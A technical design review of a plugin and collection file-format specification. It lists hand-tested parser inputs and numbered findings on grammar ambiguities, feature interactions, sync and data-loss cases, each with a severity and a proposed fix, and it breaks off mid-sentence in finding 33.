# Format revision 6, read by the person who must build it · 2026-11-27

Paper review of
[kind-and-collection-format-2026-11-24.md](../proposals/kind-and-collection-format-2026-11-24.md)
at revision 6 (`dev` at `2ce36ac5`). I read it as the person who writes the
parser, the engine, the call check and the first three plugins from it
tomorrow, with no way to ask its author. Supporting reading:
[morning report](../morning-2026-11-21.md) from the twenty-ninth round to the
end (the five coordinator sets are binding; the fifth set's merges are not yet
applied, and I do not report them: `total:` into `totals:`, `rights: change`,
`x = empty`, dropping `search:` from `plugin.md`, marks as a `mark` flag, and
P1 to P7), [primitives-only host](../proposals/primitives-only-host-2026-11-21.md),
[extension surface](../proposals/extension-surface-2026-11-27.md),
[suite stress test](../proposals/format-stress-test-suite-2026-11-27.md) and
[shared-core sizing](shared-core-sizing-2026-11-27.md).

No code was written and nothing was built or run. Every "the parser does X"
below is what the document's text says, or that it says nothing.

**Severity.** **Blocks** = I cannot build this part without guessing, and
another builder would guess differently. **Bug** = buildable as written, but
the written behaviour loses data, leaks, or goes wrong in a case the apps
reach. **Wording** = the meaning is clear enough, but the text says
something else or says it in two ways.

**Counts.** 63 findings: 25 blocks, 32 bugs, 6 wording. Of these, 12 are
security findings (§C). Five questions go to the owner (§F); everything else
is detail for the coordinator (§E).

## Contents

- A. The grammar tested by hand (findings 1 to 19)
- B. Things that break when features meet (20 to 40)
- C. Security: what the format itself opens (41 to 52)
- D. Do the examples parse? (53 to 57, and the size count 58 to 63)
- E. Fixes for the coordinator (detail)
- F. Questions for the owner (high level)
- G. What I did not check
- H. Simplification opportunities

## Twenty-two hand-tested inputs

Each input is mine. "Says" means the document decides it; "Silent" points to
the finding that covers the gap.

| # | Input | Where | What the document says the parser does |
| --- | --- | --- | --- |
| H1 | `fields:` / `  due, soft: date` (a comma in a field name) | §2.7 | Silent: no name grammar; §1.3 quotes only *values* (finding 4) |
| H2 | `fields:` / `  ratio a:b: number` (a colon in a name) | §1.3 | Silent; a first-colon split gives the name `ratio a` (findings 1, 4) |
| H3 | `marks:` / `  quoted: = contains(subject, "say \"hi\"")` | §4.1 | Silent: no escape inside double quotes (finding 3) |
| H4 | `done: set status = "done", when count(depends on, open) = 0, swipe` (a comma inside the condition) | §2.19 | Silent: a comma split cuts `count(` in two; nothing says splitting is bracket-aware (finding 1) |
| H5 | `note late: set note = "late, when overdue", when overdue, menu` | §1.3, §2.19 | Says: quoted, so the inner `, when` is text. Holds only if quotes are honoured before the comma split (finding 1) |
| H6 | `kind: files`, then a collection `from: files` | §5.3 | Silent: `files` is both a source keyword and a legal kind ID (finding 5) |
| H7 | `kind: records` in plugin `p`, then `from: p.records` | §5.3 | Silent: `<kind>.records` and `<plugin>.<kind>` read the same (finding 6) |
| H8 | `extends:` / `  calternal-mail.messages:` / `    fields:` / `      saved: yes/no` (three levels) | §1.3 | Silent: §1.3 defines one level of two-space indentation (finding 2) |
| H9 | `ical: VEVENT` followed by indented lines | §1.3, §2.17 | Contradicts §1.3: a key is either `key: value` or a key alone with indented lines (finding 2) |
| H10 | A record body line `**Ana** · 2026-11-20 17:02 ^aaaaaaaaaaaaaaaa` typed over WebDAV | §2.8 | Says: authority is the ledger, a look-alike is escaped. Silent on what a *new*, unescaped look-alike becomes, and on what the page shows as author (findings 11, 47) |
| H11 | A record whose next line is `Note: felt heavy` (no `note` field declared) | §2.8 | Silent: fields are "`key: value` lines right after its header, then its text", with no rule for where fields end (finding 11) |
| H12 | `fields:` / `  größe: number` and a hand-written item key `Größe:` (NFD, capital) | §2.3, §1.4 | Says NFC for *file names* (0023). Silent on field names, kind IDs and case (finding 4) |
| H13 | Item frontmatter `calternal-reading-list: yes` (a person's own key equal to an adding plugin's ID), then the plugin writes its added field `saved` | §7.2 | Silent: "stored … under the adding plugin's name (`calternal-reading-list.saved: yes`)" could be a flat dotted key or a nested map; the nested form collides (finding 10) |
| H14 | `colour: colour, default #c96f4a` | §1.3 | Says `#` starts a comment, so the default is empty and the line is refused or silently defaultless. Silent on which (finding 3) |
| H15 | `status: choice(did not happen)` and `did not happen: set status = did not happen, menu` | §2.19, §4.1 | Silent: the bare value reads as `did`, `not`, `happen` (findings 7, 4) |
| H16 | `matrix: priority in (urgent, high), urgent` in Tasks, which also has a computed field `urgent` | §5.2 (the document's own example) | Silent: `urgent` inside `in (…)` is the choice value or the field (finding 7) |
| H17 | `fills:` / `  calternal-chat:composer: frame frames/composer.html` | §7.5 (own example) | A first-colon split gives the place `calternal-chat` (finding 1) |
| H18 | `time spent: = sum(from(calternal-calendar.events.task, logged).length)` | §4.1 | Silent: `calternal-calendar` lexes as `calternal - calendar` (finding 4) |
| H19 | `keep: 6m` (meaning six months) | §2.14, §4.1 | Says `30m` is minutes, so items go to Trash six minutes after creation (finding 9) |
| H20 | `- allow change in today` in agent rules | §9 | Silent: `in <collection>` (first form) and `in <folder>` (second form) both fit (finding 19) |
| H21 | Item `read:` key absent, collection `where: not read` | §4.1, §17 | Silent: no rule for empty in a condition (finding 8) |
| H22 | `rest: duration, default 2m` and `remind: set remind = now() + 1mo` | §4.1 | Silent: no month duration exists (finding 9) |

## A. The grammar tested by hand

### 1. Splitting a line: colons and commas inside brackets, quotes and IDs

- **Section:** §1.3, §2.7, §2.19, §7.5.
- **Text:** "A header line is `<key>: <value>` … Text values with commas,
  colons or `#` are written in double quotes."
- **Failing examples (from the document itself):** `calternal-chat:composer:
  frame frames/composer.html` (§7.5), `calternal-notes:sidebars/notes:`
  (§7.2), `favourite: yes/no, default no, in sidecar xmp:Rating=5` (§2.7),
  `next(repeat, after: last(log.done))` (§4.2) inside a field line, and
  `log: records(done: time, due: date, skipped: date)` (§3), where the
  commas inside the brackets are not flag separators. H4's condition
  `count(depends on, open)` is cut in two by a plain comma split.
- **Severity:** blocks. A builder who follows "quote anything with a colon
  or comma" refuses half of the document's examples; one who does not has no
  rule.
- **Smallest fix:** "A name ends at the first colon followed by a space that
  is outside quotes, brackets and `<…>`. A value splits at commas outside
  quotes and brackets. A colon not followed by a space (`xmp:Rating`,
  `calternal-chat:composer`) is part of the word." Then drop the quoting rule
  for colons.

### 2. Nesting depth, a key with both a value and children, continuation lines

- **Section:** §1.3, §2.17, §5.4, §7.2.
- **Text:** "a key alone followed by indented lines (two spaces) that belong
  to it."
- **Failing examples:** `extends:` has three levels (target, sub-key,
  field line). `ical: VEVENT` has a value *and* children. `totals:` lines
  "may continue on indented lines" at six spaces. Nothing says whether tabs
  or four spaces are refused or read.
- **Severity:** blocks.
- **Smallest fix:** "Nesting goes in steps of exactly two spaces, to any
  depth the key's grammar allows. A key may have a value and children. A line
  indented further than the next child level continues the line above. Tabs
  are refused at install, naming the line."

### 3. Quotes, escapes, comments and list brackets

- **Section:** §1.3, §7.1, §11.
- **Text:** "`#` begins a comment to the end of the line, except inside
  double quotes."
- **Failing examples:** H3 (a quote inside a quoted value); H14 (`default
  #c96f4a` becomes a comment); whether the rule also applies in the Markdown
  body, where `# Heading` is a heading; `needs: [a, b optional]` and
  `calls: []` use brackets, while `reads:` and `programs:` use a bare list,
  and nothing says the two are equivalent; `agent rules:` lines in `space.md`
  start with `- `, `fills:` lines do not.
- **Severity:** blocks (two parsers will disagree on files the server
  accepted).
- **Smallest fix:** "Inside double quotes, `\"` and `\\` are the only
  escapes; quotes are removed from the value. `#` starts a comment only in
  the header, at the start of a line or after a space. `[a, b]` and `a, b`
  are the same list and `[]` is empty. A leading `- ` is allowed only on
  agent-rule lines."

### 4. There is no grammar for names

- **Section:** §1.2, §2.7, §4.1, §7.1.
- **Text:** none; names appear only by example.
- **Failing examples:** names have spaces (`all day`, `reps in reserve`,
  `waiting on`), contain keywords (`in` in `reps in reserve`, `not` in `did
  not happen`), hyphens (`plan-days`, and every plugin ID, so
  `calternal-calendar.events` in a formula is a subtraction, H18),
  apostrophes (`won't do` in the suite), and Unicode (H12). Nothing says
  whether `Title` and `title` are one field, or whether names are NFC. A
  "longest declared name wins" lexer is not a fix: adding a field in an
  update would change how existing formulas parse.
- **Severity:** blocks.
- **Smallest fix:** "A name is NFC, case-sensitive, starts with a letter,
  and holds letters, digits, single spaces, `-` and `'`. It may not equal a
  reserved word (finding 5) or contain one as a whole word. In a formula, a
  name with `-`, `'` or a dot-qualified plugin part is written in square
  brackets: `[calternal-calendar.events].task`, `[won't do]`." Square
  brackets are free inside formulas: `in` uses round ones.

### 5. No list of reserved words

- **Section:** §2.19, §3, §4.1, §5.3.
- **Text:** none.
- **Failing examples:** a yes/no field named `swipe` makes `flag: set x =
  1, when swipe` either a condition or a placement; `kind: files` against
  `from: files` (H6); fields named `body`, `id`, `kind`, `created`,
  `records`, `settings`, `period`, `this`, `item`, `state`, `empty`, `code`,
  `ask`, `share`, `phrases`, `only`, `within`, `after`, `any`.
- **Severity:** blocks.
- **Smallest fix:** one table of reserved words (operators, value words,
  placement words, line keywords, source keywords, built-in field and entry
  names), refused at install as names of kinds, fields, operations,
  collections and settings.

### 6. How a dotted name resolves, and the scope inside list functions

- **Section:** §1.2, §4.1, §4.2, §5.3.
- **Text:** "Inside a plugin's own files the plugin part is left out";
  "a linked item's field with a dot, one hop only".
- **Failing examples:** `messages.thread` inside Mail is own kind `messages`
  and its link field `thread`, or a plugin named `messages` and its kind
  `thread`; `a.b.c` may be plugin.kind.operation, kind.records.field or
  plugin.kind.link field; `source.owned` (Calendar) reads into a `data`
  field, which no rule allows; `own calendar.colour` hops through a
  *computed* link. Inside `count(depends on, open)`, `open` must be the
  dependency's field, and inside `from(transactions.category, month(date) =
  period)`, `date` is the transaction's but `period` is the outer item's.
  Nothing says what happens when the element lacks a name the outer item
  has: a silent fall-through gives a wrong count with no error.
- **Severity:** blocks.
- **Smallest fix:** "Inside a list function's condition, names are the
  element's; the outer item is `this.<field>`, and `period` and `settings.`
  are global. A name the element lacks is an install error. Another
  plugin's thing is always written in full, in brackets (finding 4); an own
  kind may not share a name with an own field. A dot after a `data` field
  reads a key of it. A computed link counts as the one hop."

### 7. Choice values: bare in some places, quoted in others

- **Section:** §2.19, §4.1, §5.2, §5.5.
- **Text:** "text in double quotes" (§4.1), but `set read = yes`, `matrix:
  priority in (urgent, high), urgent`.
- **Failing examples:** H15 and H16. In the suite, `where: status =
  "someday"` and `drop: set status = someday` sit side by side, and Workouts
  has both an operation and a field named `done`.
- **Severity:** blocks.
- **Smallest fix:** "Choice values are text and are quoted wherever a
  formula appears, including `set`, `drop:`, `in (…)` and `matrix:`." Fix
  §5.2's own example to `priority in ("urgent", "high"), urgent`.

### 8. Precedence, empty, and `or` as "otherwise"

- **Section:** §4.1.
- **Text:** "Operators: `+ - * /`, `= != < <= > >=`, `and`, `or`, `not`,
  `in (…)`."
- **Failing examples:** `not a = b` and `a or b and c` have no stated
  grouping. H21: is a missing `read` false? Is `due < today()` true, false
  or empty when `due` is empty? The suite uses `or` to mean "the first that
  is not empty" (`calendar or first(under(tags, "area"))`, `end or start +
  15m`, `due or scheduled`), which §4.1's boolean `or` does not allow.
- **Severity:** blocks.
- **Smallest fix:** a precedence table (`not` > comparison > `and` > `or`,
  left to right); "empty is false in a condition; any comparison with empty
  is false; arithmetic with empty is empty"; and extend `first(a, b, …)` to
  return the first non-empty value, as two-value `min` and `max` already
  do, so no new function is needed.

### 9. Units, durations and money

- **Section:** §3, §4.1, §2.14.
- **Text:** "durations (`7d`, `2h`, `30m`)"; "`number <unit>[|<unit>]` … shown
  in the person's choice"; "`money [<currency>]` An exact decimal with a
  currency".
- **Failing examples:** H19: `keep: 6m` sends items to Trash after six
  minutes. H22: no month exists. Two members log `weight` in kg and lb:
  which unit is stored, and does `sum` convert? Nothing names the units the
  engine knows. `12.50 EUR + 3 USD` and `sum(amount)` over mixed currencies
  have no result. `number` is not said to be exact or a float. `days(a, b)`
  returns a number while `date - date` is a duration. `format(v, pattern)`
  has no pattern language (is it §2.3's `YYYY-MM-DD` tokens? numbers?).
  `week: = days(starts, today()) / 7 + 1` (Workouts) gives 2.43.
- **Severity:** bug (the `keep:` case loses data with no warning).
- **Smallest fix:** "Duration units are `s min h d w mo y`; `m` is
  refused" (and change the examples to `30min`, `2min`); "a two-unit number
  is stored in the first unit and converted on input; the engine's unit
  table is fixed"; "arithmetic across currencies is an error value";
  "`number` is a decimal like `money`"; "`format` takes §2.3's date tokens
  and `0.00` for numbers".

### 10. How each type is written in an item's YAML

- **Section:** §1.4, §3, §7.2.
- **Text:** "Item files use ordinary YAML frontmatter"; "`link(<kind>)` …
  stored as Markdown links".
- **Failing examples:** `project: [Mail](<../Projects/Mail.md>)` unquoted is
  a YAML flow sequence followed by garbage. Nothing says how `person`
  (ID or name?), `place`, `colour`, `money`, `number kg`, `when`, `repeat`,
  `data`, `records(…)` fields and nested `tags` are written. `read: no` is a
  boolean in YAML 1.1 and the string `"no"` in YAML 1.2, so the item in §1.4
  reads differently in Obsidian and in a 1.2 library. H13: flat or nested
  added-field keys. "Ordinary YAML" includes anchors, aliases and tags, so a
  hand-written file with an alias bomb reaches every device's parser.
- **Severity:** blocks.
- **Smallest fix:** one table "type → the form written → the forms read",
  and: "Items use the YAML 1.2 core schema without anchors, aliases, tags or
  flow mappings; a file that uses them is a Problem. Links are written as
  quoted strings. Added fields are flat dotted keys. Yes/no is written
  `true`/`false` and read from `yes`/`no` too." (This changes §1.4's
  example.)

### 11. Record blocks

- **Section:** §2.8, §8.1.
- **Text:** "It starts with a header line … and ends where the next header
  begins … A record's fields are `key: value` lines right after its header,
  then its text."
- **Failing examples:** H11 (where fields stop); text before the first
  record, and a paragraph or `## Notes` a person writes after the last
  record over WebDAV, which becomes part of the last set; a display name
  containing `**` or `·`; what "looks like a header" means for the escape;
  the record's own author, time and anchor are not reachable as fields, so
  the suite's Weekly volume chart (`week(date)` over `sessions.records`) has
  no `date` to group by unless it writes `item.date`; `change record` with no
  `within` (Workouts) has no stated window.
- **Severity:** blocks (Workouts and Chat are records).
- **Smallest fix:** "Record fields are the consecutive `key: value` lines,
  after the header, whose key is a declared record field; the first other
  line starts the text. Body text before the first header is the item's
  own. A record ends at the next header or at a line `---` alone. A header
  is exactly `**<name>** · <YYYY-MM-DD HH:MM> ^<16 chars>` with `*` and `·`
  in the name escaped. Each record has the built-in fields `author`, `at`
  and `anchor`. A `change record` line without `within` lets the author
  change it at any time."

### 12. Is an outside edit the `change` operation?

- **Section:** §2.5, §2.12, §2.17, §2.19.
- **Text:** "An outside change: An ordinary write by the signed-in person,
  checked by `checks:`" (§2.5); "A write that fails a check is refused … A
  hand edit that fails becomes a Problem" (§2.12).
- **Failing examples:** Calendar declares `change: only title, body,
  calendar, when empty(source) or source.owned`. A WebDAV or CalDAV client
  rewrites `start` on a connected event. If the outside write is the `change`
  built-in, it is refused; if it is not, `only` and `when` are bypassed by any
  WebDAV client, and Calendar pushes the change upstream. Is a WebDAV PUT a
  "write" (refused) or a "hand edit" (a Problem)? May it change a `data`
  field (finding 49) or another person's record (finding 47)? Is a WebDAV
  DELETE subject to `remove: when not reconciled`?
- **Severity:** blocks.
- **Smallest fix:** "An outside write is diffed field by field and checked
  as the built-in `add`, `change` or `remove`, with their `only` and `when`,
  the role line, `checks:`, `data` fields and records. A failure refuses the
  whole request with the reason (HTTP 403 or 409). A Problem is only a file
  the server finds changed on disk outside its own protocols."

### 13. Which kind a new outside file belongs to

- **Section:** §1.1, §1.4, §2.3.
- **Text:** "Items live in the kind's folder (§2.3)"; "The server adds `id:`
  and `kind:` as read-only copies; host state holds the truth."
- **Failing examples:** Calendar's `events` and `days` both have `folder:
  Calendar`, and `calendars` and `accounts` live below it, so
  `Calendar/2026-11-27.md` dropped over WebDAV has two candidate kinds and
  `Calendar/Calendars/x.md` has three. A file copied in Finder keeps its
  `id:`, so two files claim one ID. A new file whose `kind:` line names
  another kind. A file created outside without `added` or `read`: are the
  defaults written into it (a rewrite §1.4 forbids on read) or applied
  only in the index?
- **Severity:** blocks.
- **Smallest fix:** "A new file belongs to the kind whose folder pattern
  matches it most deeply; when two kinds match the same path, the `file:`
  pattern decides; when that also ties, the install is refused. A taken
  `id:` gets a new ID on accept. A file's `kind:` line is ignored. Defaults
  are written into an outside file once, when it is accepted, as one
  recorded write."

### 14. Kind IDs and installed file paths collide across plugins

- **Section:** §1.1, §1.2, §2.1.
- **Text:** "`kind`: The kind's ID, unique in the space"; "Installing copies
  the Markdown files into the space: `.calternal/kinds/`,
  `.calternal/collections/` …".
- **Failing examples:** Money, Mail and Calendar each declare `kind:
  accounts` (both stress tests). Calendar, Tasks and Workouts each ship
  `collections/today.md`, and three apps ship an `inbox` collection: they
  overwrite one another in a flat `.calternal/collections/`. A kind made with
  "New kind" in the app has no plugin, so it has no `<plugin>.<kind>` name
  for `extends:`, agent rules or `reads:`.
- **Severity:** blocks.
- **Smallest fix:** "Kind and collection IDs are unique within their plugin.
  Installing copies a plugin's files to `.calternal/plugins/<plugin>/`, with
  `plugin.md` and the folders `kinds/`, `collections/` … inside. Kinds made
  in the app belong to the plugin `space`, named `space.<kind>`." Relative
  links such as `../collections/unread.md` keep working.

### 15. Operation lines against their own examples

- **Section:** §2.19, §2.10.
- **Text:** "`remove[, when <condition>]`"; "`[, swipe|menu|primary]`";
  "`open where <condition>` … with `unique`, adds it if missing".
- **Failing examples:** the table's own `remove: when not reconciled` has a
  colon the grammar does not allow. Tasks writes `done: … , swipe, primary`
  (two placements). `today: open where date = today() and plan day.next =
  today()`: when it adds a missing item, which fields does it set? The
  engine cannot invert `plan day.next = today()`. With several matches and no
  `unique`, which one opens? A choice field with a value `ask` makes `set f =
  ask` ambiguous. "`<plugin>.<kind>.<operation>` when two kinds share a name"
  means two kinds that share an *operation* name, since kind IDs are unique.
- **Severity:** bug.
- **Smallest fix:** allow both `remove, when` and `remove: when`; allow
  `swipe`, `menu` and `primary` together; "`open where` adds only when its
  condition is `<unique field> = <value>` (optionally `and`-ed with other
  equalities, which it also sets); otherwise it opens the first match by the
  kind's sort, or a list"; `ask` is reserved (finding 5); fix the wording in
  §1.2.

### 16. `lines:` notation and its missing default

- **Section:** §0, §2.9.
- **Text:** "`[x]` is optional" (§0); "`[, box <field>: [ ] <value>, [/]
  <value>, [x] <value>, [-] <value>]`" (§2.9).
- **Failing examples:** in that one grammar line, `[x]` is both the optional
  notation and a literal box. Without `box`, which value does a tick set on a
  five-value `status`? `lines: time in calternal-calendar.days` sits in
  Calendar's own kind, where §1.2 says the plugin part is left out.
- **Severity:** wording (the meaning can be guessed, but a builder should
  not have to).
- **Smallest fix:** write the literal boxes in backticks; "without `box`,
  the field must be yes/no"; say whether an own kind may be written in full.

### 17. Collection details a builder cannot guess

- **Section:** §4.1, §5.1, §5.3.
- **Text:** "member fields stored beside each member in the body … `- [Mail](<…>)
  status: Done`"; "in a collection condition, `this` (the open item: `links
  to this`)".
- **Failing examples:** two member fields on one line, or a value with a
  space (`status: Done today priority: high`), have no delimiter. A person
  hand-adds members to a plugin's collection, then the plugin updates:
  sidebars keep "the person's version" (§6), collections have no such rule,
  so the members are overwritten. `links to` is not an operator in §4.1.
  `group:` by a `tags` field: is an item in several groups? A `from:
  lines(checkbox)` row has no defined fields (the suite uses `text`, `note`,
  `task`).
- **Severity:** blocks.
- **Smallest fix:** "Member fields follow the link as `; <field>: <value>`
  pairs." "A collection a person changed keeps their version on update and
  is offered the new one, as a sidebar." Add `links to <item>` to §4.1.
  "Grouping by a list field puts the item in each group." "A
  `lines(checkbox)` row has `text`, `done`, `note` and `task`."

### 18. Sidebar `each:` opens a "default collection" nothing defines

- **Section:** §6.
- **Text:** "Opening an entry shows that kind's default collection filtered
  to the item."
- **Failing example:** `each: calendars, where empty(account)` must open
  *events* whose `own calendar` is that calendar. "That kind" is
  `calendars`, no key names a kind's default collection, and no rule says
  which link field filters. Tasks' "then views and tags" (one entry per
  top-level tag, written in the suite as `each: under(tags, ""), from tasks`)
  has no form at all.
- **Severity:** blocks.
- **Smallest fix:** `each: <kind>[, where …] -> <collection> by <link
  field>`, and `each: tags of <kind>[, under "<parent>"] -> <collection>`
  for tag entries.

### 19. Agent rule lines

- **Section:** §9.
- **Text:** "`- allow|ask|deny <operation>[ on <kind>][ in <collection>][
  where <condition>][ outside this chat][ for <harness>]`" and "`- allow|ask|deny
  add|change|remove in <folder>[ for <harness>]`".
- **Failing examples:** H20. A condition containing ` for ` or ` in (`, or a
  kind named with a space, has no end marker (`deny change on plan day where
  status in ("a", "b") for calternal-chat-codex`).
- **Severity:** blocks.
- **Smallest fix:** "In the first form, `in` names a collection by its
  `<plugin>:collections/<id>` form; in the second, a folder ends in `/`
  (`in Notes/Work/`). The condition runs to ` outside this chat`, ` for ` or
  the end of the line, and may not contain those words outside quotes."

## B. Things that break when features meet

### 20. Who is acting when nobody acted

- **Section:** §8, §8.1, §17.
- **Text:** "Every call goes through the server as the acting person
  (`s.me`)."
- **Failing example:** §17's only code, `on.time("reading.remind", …
  s.notify([s.me], …))`. A timer has no acting person. In a shared space,
  Ana saved the link and Lee set the reminder: who is `s.me`? The same goes
  for `on.schedule` (Calendar's sync every 15 minutes), `on.outside` with
  `secret` or `signed`, and `on.connection`. Also unstated: when a `date` or
  `when` field "arrives" (whose midnight, for a shared task?); whether a time
  missed while the server was down fires late or never; what
  `on.change(<collection>)` fires on (entering, leaving, any change of a
  member?); and the minimum interval of `on.schedule` (an item with
  `FREQ=SECONDLY`).
- **Severity:** blocks (the document's own example cannot run).
- **Smallest fix:** "`on.time` and `on.schedule` act as the person who last
  set that field (stamped in history); `on.connection` as the person the
  sign-in belongs to; `on.outside` with `secret` or `signed` as no person,
  with only the plugin's own kinds writable and no `s.notify`. A date
  arrives at 09:00 in that person's zone. A missed time fires once on
  restart. `on.change(<collection>)` fires when an item enters, leaves or
  changes. A schedule runs at most every 5 minutes (operator default)."

### 21. One idempotency key per event, but a handler writes twice

- **Section:** §8 "Delivery".
- **Text:** "Every event is delivered at least once, with a key; a write made
  with the same key is a replay."
- **Failing example:** Tasks' repeat handler writes the log, then writes the
  next occurrence. Both writes carry the event's key, so the second is taken
  as a replay of the first and dropped. If the plugin supplies keys itself,
  nothing says so, and plugins will forget.
- **Severity:** bug.
- **Smallest fix:** "The server keys each write as (event key, index of the
  write within the handler run); a replayed handler that writes in the same
  order replays exactly."

### 22. What `s.write` may touch outside the plugin's own kinds

- **Section:** §8.1, §12.
- **Text:** `s.write` takes "`add(kind, …)`, `change(item, …)`, … `move(item,
  folder?, file?)`".
- **Failing examples:** the call check needs a rule for `s.write` on another
  plugin's editable-outside kind (allowed directly, as primitives §4.4 says,
  or only through `calls:`?), on its added fields (M2's key prefix), and
  whether `reads:` is needed for a `change` that names a base. `move` into
  another kind's folder changes a file's kind, which §12 closes; `move` of an
  item with a `folder:` pattern contradicts the pattern; the Files app must
  move photos and documents it does not own.
- **Severity:** blocks (the call check is the one thing that must be exact).
- **Smallest fix:** a five-row table in §8.1: own kinds (all changes); other
  plugins' editable-outside kinds (all changes, needs `reads:`); other
  plugins' operations-only kinds (only the plugin's own added keys); `move`
  (only within the kind's own folder tree, refused for patterned kinds unless
  the pattern fields change with it); Files (a declared `moves files` line on
  the install sheet, or Files is the server's).

### 23. `s.share` against "never open"

- **Section:** §8.1, §12.
- **Text:** "`s.share(item, people, role)`" against "the share sheet and any
  widening of sharing" (§12).
- **Failing example:** while spaces are the only read boundary (O4 not yet
  answered), every member already reads every item, so sharing inside the
  space does nothing, and sharing outside always goes to the server's sheet.
  What does the call do?
- **Severity:** wording.
- **Smallest fix:** state that `s.share` only *opens* the server's sheet,
  pre-filled, and returns once the person confirms or cancels; or drop it
  until O4 is answered.

### 24. Computed values that differ per viewer, in an index that holds one value

- **Section:** §4.3, §7.6, §14 P6/P7.
- **Text:** "Where values live: only in the rebuildable index … The one Rust
  engine computes them on the server"; "`today()` is each device's own date
  and zone"; "`urgent within: duration, default 2d, per person`".
- **Failing example:** Tasks' `urgent: = open and … settings.urgent within`
  reads a per-person setting. Ana (2 days) and Lee (5 days) see one stored
  `urgent` value, and it is right for one of them at most. `overdue` with
  `today()` differs between Lisbon and Tokyo. The fifth set's `state.` in
  formulas makes this worse.
- **Severity:** bug.
- **Smallest fix:** "A kind's computed field may not read `per person`
  settings or `state.`; those belong in collection `fields:`, computed per
  viewer at query time. The server's `today()` uses the space's zone; a
  device shows its own and marks a difference as not yet confirmed."

### 25. "Re-run at their next change time" is not computable for any formula

- **Section:** §4.3.
- **Text:** "Formulas with `now()` re-run at their next change time (an
  event's end), never by polling."
- **Failing example:** `logged: = ends <= now()` has an obvious next change.
  `stale: = days(edited, date(now())) > 3 and not done` needs symbolic
  solving; `round(days(a, now()) / 7)` changes weekly. Each builder picks a
  different subset.
- **Severity:** bug.
- **Smallest fix:** "`now()` may appear only as one side of a comparison
  whose other side does not contain `now()`; the next change time is when
  that comparison flips. Anything else with `now()` is refused at install."

### 26. The 1,000 cap after the condition cannot be answered from the index as written

- **Section:** §4.3.
- **Text:** "counted after the condition, answered from an index on the link
  field and the date's period, never by reading every linked item."
- **Failing example:** `count(from(messages.thread, in inbox))`: `in inbox`
  is a computed field and not in that index. To count "after the
  condition" the engine must read every message of the thread, which the
  same sentence forbids. With 20,000 messages in a long thread, one builder
  returns "too many items", another scans.
- **Severity:** bug.
- **Smallest fix:** "The index serves link, period and equality on stored
  fields. Any other condition is evaluated over at most 10,000 candidates
  (operator default); past that the value is 'too many items'."

### 27. `per <period>` fields are under-specified

- **Section:** §2.7, §4.2, §5.4.
- **Text:** "`per <period>` fields hold one value per period for each item";
  "`previous(<field>)` (in `per` fields only)".
- **Failing examples:** how many periods are computed, and from when (the
  first transaction ever?); which period a `row:`, `list:` or `page:` of a
  per-month field shows; a transaction back-dated to 2025 recomputes every
  later month of every category, with no bound on the chain; one month over
  the cap makes every later `previous()` "too many items" for good;
  `sum(all(categories).previous(overspent))` (§5.4) uses a method call that
  §4 does not have; `previous()` in a `totals: … per month` line breaks
  "per fields only". Offline, a device that does not hold all history
  computes a different `ready to assign` forever.
- **Severity:** blocks (Money).
- **Smallest fix:** "Periods run from the period of the kind's oldest item
  to the current one. A view shows the current period, with a period picker
  wherever a `per` field is shown. Recomputation after a back-dated change
  runs as a background job, and values show as not yet confirmed until it
  finishes. 'Too many items' in a period stops that period only; `previous()`
  of it is empty." Write `previous()` as a function over a list
  (`previous(all(categories).overspent)`) and allow it in `per` totals.

### 28. `was` holds one old name

- **Section:** §2.7.
- **Text:** "`was <old name>` … These lines are the kind's version history."
- **Failing example:** v1 `stars`, v2 `rating, was stars`, v3 `score, was
  rating`. A file nobody opened during v2 still says `stars` and is lost to
  v3. Nothing says whether the server rewrites every file at update (100,000
  writes and a sync storm) or reads old names lazily, which checklist item 8
  forbids ("no aliases") and §1.4 forbids ("nothing is rewritten on read").
- **Severity:** bug.
- **Smallest fix:** `was <old>|<older>…`; "the update rewrites every
  affected file as one background job, recorded in history, before the new
  version is active."

### 29. A plugin update adds a field a person already uses

- **Section:** §2.7 "Plugin updates (G1)" and "Fields a person adds (G3)".
- **Text:** "an added field is automatic".
- **Failing example:** a person added `rating: Great` (text, G3) to their
  books; version 2 adds `rating: number`. Every existing value fails the
  type.
- **Severity:** bug.
- **Smallest fix:** "An update that adds a field whose key already holds
  values is treated as a retype of those values: refused unless every value
  converts, naming the items."

### 30. `keep:` counts from `created`

- **Section:** §2.14.
- **Text:** "`keep` moves items to Trash once they are older than
  `<duration>`, from `created`."
- **Failing examples:** a sync token item is created once and updated
  forever; after `keep: 90d` it goes to Trash while in use, and every
  connected calendar resyncs from scratch every 90 days. An update that adds
  or shortens `keep:` on a kind holding people's items sends them to Trash
  with no warning. Trash would then list items of a kind that "has no app
  UI".
- **Severity:** bug (data loss).
- **Smallest fix:** "`keep` counts from `edited`. Adding or shortening
  `keep` in an update is listed on the update sheet with the number of items
  it would remove. Hidden kinds' items skip Trash and are removed."

### 31. Removing a plugin whose hidden kind holds an outbound queue

- **Section:** §2.14, §7.2 (G1).
- **Text:** "A `shown: no` kind has no app UI, is absent from WebDAV and
  search, and is how a plugin keeps … an outbound queue."
- **Failing example:** Mail is removed with three unsent messages in its
  queue. Nobody can see them. If Mail is installed again in a month, its
  code finds the queue and sends month-old mail.
- **Severity:** bug.
- **Smallest fix:** "The remove sheet counts what each hidden kind holds ('3
  messages not sent') and offers an export. Hidden items of a removed plugin
  are kept until `keep` runs out; a reinstall offers them to the Owner
  before the plugin's code sees them."

### 32. `unique:` offline on two devices

- **Section:** §2.10, §2.3.
- **Text:** "One item per value. The listed form `open where <condition>`
  opens it, adding it if missing."
- **Failing example:** phone and laptop are offline; both press Today and
  each adds `Calendar/2026-11-27.md`. On sync, there are two items for one
  date, and the name clash rule gives `2026-11-27 2.md`. `duplicate` on a
  unique kind, and restoring a trashed daily note when a new one exists,
  break the rule the same way.
- **Severity:** bug.
- **Smallest fix:** "An item of a unique kind takes its ID from the kind and
  the value, so two offline adds are the same item and merge through the
  generic merge. `duplicate` is refused on unique kinds; restoring over a
  live item merges into it."

### 33. Patterned files moving during a conflict or a rename

- **Section:** §2.3, §2.7 `heading`.
- **Text:** "When a field in a pattern changes, the server moves the file and
  rewrites every link to it (G6)."
- **Failing examples:** the phone renames a task (the file moves) while a
  WebDAV client PUTs the old path: a new item, a conflict, or a refusal? Two
  devices change `title` differently: a conflict "keeps both versions", but
  each version wants a different path. With `heading` and `file: {title}`,
  typing in the first heading renames the file at every save pause, and G6
  rewrites links in every space each time. A WebDAV MOVE of the file: does it
  change `title`?
- **Severity:** bug.
- **Smallest fix:** "Items are addressed by ID; a PUT to a path that moved
  is applied to the item that was there, with a redirect to its new path.
  While a pattern field is in conflict, the file stays at its old path. A
  rename from a heading is applied when the editor closes or after 30
  seconds idle. An outside MOVE of a patterned file is refused; of an
